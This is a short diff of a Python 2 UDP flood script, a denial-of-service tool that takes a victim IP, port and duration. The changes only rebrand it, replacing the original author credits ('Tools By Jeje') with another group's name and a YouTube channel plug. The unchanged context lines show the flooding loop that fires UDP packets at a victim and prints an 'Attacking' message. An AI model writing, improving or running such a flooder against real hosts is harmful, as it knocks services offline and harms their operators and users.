@@ -5,9 +5,9 @@ import sys
 
 def usage():
     print "Command: " + sys.argv[0] + " <ip> <port> <9999999>"
-    print "Tools Premium "
-    print "Tools By Jeje"
-    print "JANGAN MENGATAS NAMAKAN WASU:SAMP KALO BUKAN TEAM"
+    print "mamank goblog "
+    print "subscribe channel xstyleboy"
+    print "watermark men"
 
 def flood(victim, vport, duration):
     # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
@@ -24,7 +24,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "Attacking %s Server &  %s By Jeje%s "%(sent, victim, vport)
+        print "Attacking %s Server &  %s By Xsteam%s "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
